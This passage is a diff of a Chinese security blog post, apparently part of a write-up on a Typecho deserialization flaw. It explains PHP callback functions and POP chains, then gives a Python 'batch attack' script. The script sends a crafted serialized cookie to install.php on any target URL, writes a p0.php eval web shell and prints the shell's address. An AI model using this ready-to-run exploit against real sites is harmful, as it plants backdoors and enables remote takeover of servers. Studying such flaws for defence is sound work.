+<h3 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h3><h4 id="call-user-func-&#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;"><a href="#call-user-func-&#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;" class="headerlink" title="call_user_func &#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;"></a>call_user_func &#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;</h4><pre><code>&lt;?php 
+    function barber($type){                                    //&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;barber
         echo &quot;you wanted a $type haircut, no problem\n&quot;;
     }
-    call_user_func(&apos;barber&apos;,&apos;mushroom&apos;);                    //将函数barber的函数名作为一个参数！后面为输入的值！
+    call_user_func(&apos;barber&apos;,&apos;mushroom&apos;);                    //&#x5C06;&#x51FD;&#x6570;barber&#x7684;&#x51FD;&#x6570;&#x540D;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF01;&#x540E;&#x9762;&#x4E3A;&#x8F93;&#x5165;&#x7684;&#x503C;&#xFF01;
 ?&gt;
-通过类名、对象的方式回调
+&#x901A;&#x8FC7;&#x7C7B;&#x540D;&#x3001;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x56DE;&#x8C03;
 &lt;?php 
     /**
-     * 用call_user_func()来调用一个类里面的方法
+     * &#x7528;call_user_func()&#x6765;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;
      */
-    class myclass{                            //定义一个类
-        static function say_hello(){        //在类中定义一个函数
+    class myclass{                            //&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x7C7B;
+        static function say_hello(){        //&#x5728;&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;
             echo &quot;hello!\n&quot;;
         }
     }
     $classname = &quot;myclass&quot;;
-    //通过数组键值的方式，对类名进行回调，回调类名里面的，say_hello方法
+    //&#x901A;&#x8FC7;&#x6570;&#x7EC4;&#x952E;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5BF9;&#x7C7B;&#x540D;&#x8FDB;&#x884C;&#x56DE;&#x8C03;&#xFF0C;&#x56DE;&#x8C03;&#x7C7B;&#x540D;&#x91CC;&#x9762;&#x7684;&#xFF0C;say_hello&#x65B9;&#x6CD5;
     call_user_func(array($classname,&apos;say_hello&apos;));
 
-    //通过类名直接调用静态方法
+    //&#x901A;&#x8FC7;&#x7C7B;&#x540D;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x9759;&#x6001;&#x65B9;&#x6CD5;
     call_user_func($classname .&apos;::say_hello&apos;); // As of 5.2.3// $myobject = new myclass();
 
-    //通过对象的方式回调
+    //&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x56DE;&#x8C03;
     $myobject = new myclass();
     call_user_func(array($myobject, &apos;say_hello&apos;));
 ?&gt;
-</code></pre><h4 id="array-map-（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）"><a href="#array-map-（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）" class="headerlink" title="array_map() （函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）"></a>array_map() （函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）</h4><pre><code>实例：    将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新值的数组。
+</code></pre><h4 id="array-map-&#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;"><a href="#array-map-&#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;" class="headerlink" title="array_map() &#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;"></a>array_map() &#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;</h4><pre><code>&#x5B9E;&#x4F8B;&#xFF1A;    &#x5C06;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x6BCF;&#x4E2A;&#x503C;&#x90FD;&#x4E58;&#x4EE5;&#x672C;&#x8EAB;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;
 &lt;?php
     function myfunction($v)
     {
@@ -445,316 +319,253 @@ Referrer=http://localhost/install.php
     $a=array(1,2,3,4,5);
     print_r(array_map(&quot;myfunction&quot;,$a));
 ?&gt;
-参考：http://www.w3school.com.cn/php/func_array_map.asp
-</code></pre><h4 id="pop链的利用"><a href="#pop链的利用" class="headerlink" title="pop链的利用"></a>pop链的利用</h4><pre><code>以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。
-但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。
+&#x53C2;&#x8003;&#xFF1A;http://www.w3school.com.cn/php/func_array_map.asp
+</code></pre><h4 id="pop&#x94FE;&#x7684;&#x5229;&#x7528;"><a href="#pop&#x94FE;&#x7684;&#x5229;&#x7528;" class="headerlink" title="pop&#x94FE;&#x7684;&#x5229;&#x7528;"></a>pop&#x94FE;&#x7684;&#x5229;&#x7528;</h4><pre><code>&#x4EE5;&#x524D;&#x7406;&#x89E3;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x3002;
+&#x4F46;&#x5982;&#x679C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x4E0D;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x7C7B;&#x7684;&#x666E;&#x901A;&#x65B9;&#x6CD5;&#x4E2D;&#x3002;&#x8FD9;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x76F8;&#x540C;&#x7684;&#x51FD;&#x6570;&#x540D;&#x5C06;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x654F;&#x611F;&#x51FD;&#x6570;&#x7684;&#x5C5E;&#x6027;&#x8054;&#x7CFB;&#x8D77;&#x6765;&#x3002;
 
-把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。
-</code></pre><h3 id="批量打"><a href="#批量打" class="headerlink" title="批量打"></a>批量打</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url <span class="keyword">if</span> url.startswith(<span class="string">'http://'</span>) <span class="keyword">else</span> <span class="string">'http://'</span>+url</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    target = url+<span class="string">'/install.php?finish'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://localhost:85/install.php'</span>,</span><br><span class="line">        <span class="string">'cookie'</span>:<span class="string">"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url=target,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> html.status_code == <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'the file install.php is not exists'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'shell:'</span>, url+<span class="string">'p0.php'</span></span><br><span class="line">    <span class="keyword">except</span> Exception  ,e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">'http://localhost:85/'</span></span><br><span class="line">    poc(url)</span><br></pre></td></tr></table></figure>
+&#x628A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x5C0F;&#x7EC4;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x51FD;&#x6570;(&#x5C0F;&#x7EC4;&#x4EF6;)&#xFF0C;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x76F8;&#x540C;&#x540D;&#x5B57;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x518D;&#x4E0E;&#x7C7B;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x51FD;&#x6570;&#x548C;&#x5C5E;&#x6027;&#x76F8;&#x5173;&#x8054;&#xFF0C;&#x5C31;&#x662F;POP CHAIN &#x3002;&#x6B64;&#x65F6;&#x7C7B;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x654F;&#x611F;&#x5C5E;&#x6027;&#x90FD;&#x5C5E;&#x4E8E;&#x53EF;&#x63A7;&#x7684;&#x3002;&#x5F53;unserialize()&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x63A7;&#x5236;POP CHAIN&#x8FBE;&#x5230;&#x5229;&#x7528;&#x7279;&#x5B9A;&#x6F0F;&#x6D1E;&#x7684;&#x6548;&#x679C;&#x3002;
+</code></pre><h3 id="&#x6279;&#x91CF;&#x6253;"><a href="#&#x6279;&#x91CF;&#x6253;" class="headerlink" title="&#x6279;&#x91CF;&#x6253;"></a>&#x6279;&#x91CF;&#x6253;</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">poc</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    url = url <span class="hljs-keyword">if</span> url.startswith(<span class="hljs-string">&apos;http://&apos;</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;http://&apos;</span>+url</span><br><span class="line">    <span class="hljs-keyword">print</span> url</span><br><span class="line">    target = url+<span class="hljs-string">&apos;/install.php?finish&apos;</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="hljs-string">&apos;User-Agent&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Referer&apos;</span>:<span class="hljs-string">&apos;http://localhost:85/install.php&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;cookie&apos;</span>:<span class="hljs-string">&quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot;</span></span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        html = requests.get(url=target,headers=headers,timeout=<span class="hljs-number">3</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> html.status_code == <span class="hljs-number">404</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;the file install.php is not exists&apos;</span></span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;shell:&apos;</span>, url+<span class="hljs-string">&apos;p0.php&apos;</span></span><br><span class="line">    <span class="hljs-keyword">except</span> Exception  ,e:</span><br><span class="line">        <span class="hljs-keyword">print</span> e</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    url = <span class="hljs-string">&apos;http://localhost:85/&apos;</span></span><br><span class="line">    poc(url)</span><br></pre></td></tr></table></figure>
+    
     </div>
-
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/反序列化/">#反序列化</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/代码审计/">#代码审计</a></span>
+    
+    </div>
     
     
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/01/01/XSS_02_XSS备忘录/">XSS O2 XSS备忘录</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2018/01/01/湖湘杯check_code/">湖湘杯的一个check code题</a>
+            
+        </span>
+    </div>
     
-        
-      
+</article>
 
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
-            
-          </div>
-        
 
-        
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2018/01/01/phpmyadmin 4.8.1任意文件包含漏洞-CTF/" rel="next" title="phpmyadmin 4.8.1任意文件包含漏洞-CTF">
-                  <i class="fa fa-chevron-left"></i> phpmyadmin 4.8.1任意文件包含漏洞-CTF
-                </a>
-              
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/01/01/XSS_02_XSS备忘录/" rel="prev" title="XSS O2 XSS备忘录">
-                  XSS O2 XSS备忘录 <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析："><span class="nav-number">1.</span> <span class="nav-text">漏洞分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP反序列化漏洞可利用的魔术方法"><span class="nav-number">1.2.</span> <span class="nav-text">PHP反序列化漏洞可利用的魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#满足的条件为："><span class="nav-number">1.3.</span> <span class="nav-text">满足的条件为：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析过程："><span class="nav-number">1.4.</span> <span class="nav-text">分析过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附上网络上的EXP："><span class="nav-number">1.5.</span> <span class="nav-text">附上网络上的EXP：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP分析"><span class="nav-number">1.6.</span> <span class="nav-text">EXP分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程："><span class="nav-number">1.7.</span> <span class="nav-text">利用过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">1.8.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.9.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func-（把第一个参数作为回调函数调用）"><span class="nav-number">1.9.1.</span> <span class="nav-text">call_user_func （把第一个参数作为回调函数调用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-map-（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）"><span class="nav-number">1.9.2.</span> <span class="nav-text">array_map() （函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pop链的利用"><span class="nav-number">1.9.3.</span> <span class="nav-text">pop链的利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#批量打"><span class="nav-number">1.10.</span> <span class="nav-text">批量打</span></a></li></ol></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
